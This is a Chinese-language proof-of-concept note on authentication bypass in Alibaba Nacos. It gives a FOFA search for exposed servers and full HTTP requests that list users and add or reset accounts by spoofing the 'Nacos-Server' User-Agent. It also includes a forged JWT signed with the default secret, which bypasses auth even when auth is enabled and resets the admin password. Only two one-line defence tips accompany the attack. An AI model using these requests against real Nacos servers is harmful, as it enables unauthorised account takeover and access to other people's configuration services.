# Alibaba Nacos认证绕过

## 搜索资产
`fofa：title="Nacos"`

## POC：
#### 查看用户
```shell
GET /nacos/v1/auth/users?pageNo=1&pageSize=100 HTTP/1.1
User-Agent: Nacos-Server
Host: x.x.x.x
Connection: close
```
![](img/query.png)  
请求url不存在的话去掉`/nacos/`尝试  
#### 修改/添加用户
修改用户：使用 PUT 请求，newPassword 参数  
添加用户：使用 POST请求，password 参数  
```shell
PUT /nacos/v1/auth/users HTTP/1.1
Host: x.x.x.x
User-Agent: Nacos-Server
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

username=nacos&newPassword=bbbb
```
![](img/add.png)
请求url不存在的话去掉`/nacos/`尝试  
#### 防御方法
开启鉴权：在application配置文件中修改nacos.core.auth.enabled为true  

## 开启鉴权绕过
## POC
#### 获取Cookie
调用登陆接口添加请求头：`Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg5OTE5NH0.ZZcQGFGfsFBmmf2eDSwL2Cpz9QOLgxVoVt8MbV25J84`  
```shell
POST /nacos/v1/auth/users/login HTTP/1.1
Host: 172.16.7.149:8848
Content-Type: application/x-www-form-urlencoded
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg5OTE5NH0.ZZcQGFGfsFBmmf2eDSwL2Cpz9QOLgxVoVt8MbV25J84
Content-Length: 25

username=aaa&password=aaa
```
![](img/bypassLogin.png)
#### 修改/添加用户
调用修改用户接口添加请求头`Authorization`和上一步获取到的`Cookie`  
```
PUT /nacos/v1/auth/users HTTP/1.1
Host: 172.16.7.149:8848
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg5OTE5NH0.ZZcQGFGfsFBmmf2eDSwL2Cpz9QOLgxVoVt8MbV25J84
Cookie: JSESSIONID=55DDC753866DA432CE9D87A6BC8B517C
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

username=nacos&newPassword=abcde
```
![](img/bypassAdd.png)
#### 防御方法
修改默认token.secret.key的值